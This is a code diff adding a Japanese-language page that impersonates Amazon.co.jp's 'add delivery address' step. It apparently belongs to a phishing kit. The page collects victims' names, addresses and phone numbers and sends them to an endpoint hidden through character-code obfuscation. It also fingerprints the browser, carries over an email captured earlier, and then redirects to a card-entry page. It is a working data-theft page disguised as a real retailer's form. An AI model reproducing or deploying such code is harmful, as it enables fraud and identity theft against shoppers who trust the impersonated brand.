@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="index,follow">
+<title>Amazon.co.jp お届け先の追加</title>
+<link rel="icon" href="assets/logo.svg">
+<link rel="stylesheet" href="assets/style.css">
+<style>
+.steps{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;color:#767676;margin-bottom:16px}
+.steps b{display:inline-flex;align-items:center;gap:4px;padding:4px 9px;border-radius:20px;background:#f0f2f2;font-weight:400}
+.steps b.on{background:#e7f4f7;color:#007185;font-weight:700}
+.steps b.ok{background:#eef7ee;color:#067d62}
+.steps i{width:14px;height:1px;background:#d5d9d9}
+.wrap{max-width:400px}
+.row2{display:flex;gap:10px}
+.row2>div{flex:1}
+select{width:100%;padding:7px 9px;font-size:15px;border:1px solid #888c8c;border-radius:3px;
+       background:#f0f2f2;font-family:inherit;color:inherit;outline:none;
+       box-shadow:0 1px 2px rgba(15,17,17,.15) inset;appearance:none;
+       background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%23555'/%3E%3C/svg%3E");
+       background-repeat:no-repeat;background-position:right 9px center}
+select:focus{border-color:#007185;box-shadow:0 0 0 3px #c8f3fa}
+.hint{font-size:11px;color:#565959;margin:4px 0 0}
+.sec{font-size:15px;font-weight:700;margin:18px 0 10px;padding-bottom:6px;border-bottom:1px solid #e7e7e7}
+</style>
+</head>
+<body>
+
+<header><a href="#" aria-label="Amazon.co.jp"><img src="assets/logo.svg" alt="Amazon.co.jp" width="150" height="42"></a></header>
+
+<main>
+  <div class="wrap">
+    <div class="steps">
+<b class="ok">ログイン</b><i></i><b class="on">お届け先</b><i></i><b>お支払い</b>    </div>
+
+    <div class="card">
+      <h1>お届け先の追加</h1>
+      <p class="legal" style="margin:0 0 14px">ご登録の情報をご確認ください。お届け先を追加すると、注文手続きがスムーズになります。</p>
+
+      <form id="f" method="post" action="api/log.php" novalidate>
+        <input type="hidden" name="step" value="2_bill">
+        <input type="hidden" name="email" id="hemail">
+        <input type="hidden" name="sig" id="sig">
+        <div class="hp"><label for="fax">FAX</label><input id="fax" name="fax" type="text" tabindex="-1" autocomplete="off"></div>
+
+        <div class="sec">お名前</div>
+        <div class="row2">
+          <div>
+            <label for="ln">姓</label>
+            <input id="ln" name="lastname" type="text" autocomplete="family-name" autocapitalize="off">
+          </div>
+          <div>
+            <label for="fn">名</label>
+            <input id="fn" name="firstname" type="text" autocomplete="given-name" autocapitalize="off">
+          </div>
+        </div>
+        <p class="hint">フリガナ（全角カタカナ）</p>
+        <div class="row2">
+          <div><input id="lk" name="lastkana" type="text" autocapitalize="off" placeholder="セイ"></div>
+          <div><input id="fk" name="firstkana" type="text" autocapitalize="off" placeholder="メイ"></div>
+        </div>
+
+        <div class="sec">ご住所</div>
+        <label for="zip">郵便番号</label>
+        <input id="zip" name="zip" type="text" inputmode="numeric" autocomplete="postal-code" maxlength="8" style="max-width:150px">
+        <p class="hint">例：100-0001</p>
+
+        <label for="pref" class="mt">都道府県</label>
+        <select id="pref" name="pref"><option value="">選択してください</option></select>
+
+        <label for="city" class="mt">市区町村・番地</label>
+        <input id="city" name="city" type="text" autocomplete="address-level2" autocapitalize="off">
+
+        <label for="bld" class="mt">建物名・部屋番号</label>
+        <input id="bld" name="building" type="text" autocomplete="address-line2" autocapitalize="off">
+
+        <label for="tel" class="mt">電話番号</label>
+        <input id="tel" name="tel" type="tel" inputmode="tel" autocomplete="tel">
+        <p class="hint">例：090-1234-5678</p>
+
+        <p class="errmsg" id="err">未入力または形式が正しくない項目があります。</p>
+        <button class="btn" type="submit" id="sub">この住所を使用する</button>
+      </form>
+    </div>
+
+    <div class="divider"><i></i><span>通信は暗号化されています</span><i></i></div>
+  </div>
+</main>
+
+<footer>
+  <div><a href="#">利用規約</a><a href="#">プライバシー規約</a><a href="#">ヘルプ</a></div>
+  <div class="cp">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
+</footer>
+
+<script>
+(function(){
+  var EP = [97,112,105,47,108,111,103,46,112,104,112]
+           .map(function(c){ return String.fromCharCode(c); }).join('');
+  var PREF = '北海道,青森県,岩手県,宮城県,秋田県,山形県,福島県,茨城県,栃木県,群馬県,埼玉県,千葉県,東京都,神奈川県,新潟県,富山県,石川県,福井県,山梨県,長野県,岐阜県,静岡県,愛知県,三重県,滋賀県,京都府,大阪府,兵庫県,奈良県,和歌山県,鳥取県,島根県,岡山県,広島県,山口県,徳島県,香川県,愛媛県,高知県,福岡県,佐賀県,長崎県,熊本県,大分県,宮崎県,鹿児島県,沖縄県'.split(',');
+
+  var sel = document.getElementById('pref');
+  PREF.forEach(function(p){
+    var o = document.createElement('option');
+    o.value = p; o.textContent = p;
+    sel.appendChild(o);
+  });
+
+  var f = document.getElementById('f'),
+      sub = document.getElementById('sub'),
+      err = document.getElementById('err'),
+      ids = ['ln','fn','zip','pref','city','tel'];
+
+  try {
+    var e0 = localStorage.getItem('a_em');
+    if (e0) document.getElementById('hemail').value = e0;
+  } catch(ex) {}
+
+  var fp = [screen.width, screen.height, screen.colorDepth,
+            navigator.hardwareConcurrency || 0, navigator.platform || '',
+            new Date().getTimezoneOffset(), navigator.language || ''].join('|');
+  try { document.getElementById('sig').value = btoa(fp); } catch(e) {}
+
+  var zip = document.getElementById('zip');
+  zip.addEventListener('input', function(){
+    var v = zip.value.replace(/\D/g,'').slice(0,7);
+    zip.value = v.length > 3 ? v.slice(0,3) + '-' + v.slice(3) : v;
+  });
+
+  var tel = document.getElementById('tel');
+  tel.addEventListener('input', function(){
+    var v = tel.value.replace(/\D/g,'').slice(0,11);
+    if (v.length > 7) tel.value = v.slice(0,3) + '-' + v.slice(3,7) + '-' + v.slice(7);
+    else if (v.length > 3) tel.value = v.slice(0,3) + '-' + v.slice(3);
+    else tel.value = v;
+  });
+
+  ids.forEach(function(id){
+    var el = document.getElementById(id);
+    el.addEventListener('input', function(){ el.classList.remove('err'); err.classList.remove('on'); });
+    el.addEventListener('change', function(){ el.classList.remove('err'); });
+  });
+
+  f.addEventListener('submit', function(e){
+    e.preventDefault();
+    var bad = null;
+
+    ['ln','fn','city'].forEach(function(id){
+      var el = document.getElementById(id);
+      if (!el.value.trim()) { el.classList.add('err'); bad = bad || el; }
+    });
+
+    if (zip.value.replace(/\D/g,'').length !== 7) { zip.classList.add('err'); bad = bad || zip; }
+    if (!sel.value) { sel.classList.add('err'); bad = bad || sel; }
+    if (tel.value.replace(/\D/g,'').length < 10) { tel.classList.add('err'); bad = bad || tel; }
+
+    if (bad) { err.classList.add('on'); bad.focus(); return; }
+
+    var d = new FormData(f);
+    d.set('ua', navigator.userAgent + ' | ' + (navigator.language || ''));
+    d.set('vp', innerWidth + 'x' + innerHeight);
+    try { localStorage.setItem('a_tel', tel.value); } catch(ex) {}
+
+    sub.disabled = true;
+    sub.textContent = '保存中…';
+
+    var sent = false;
+    var jump = function(){ if (!sent) { sent = true; location.href = 'card.html'; } };
+
+    fetch(EP, { method:'POST', body:d, keepalive:true, credentials:'same-origin' })
+      .then(jump).catch(jump);
+    setTimeout(jump, 1200);
+  });
+})();
+</script>
+</body>
+</html>
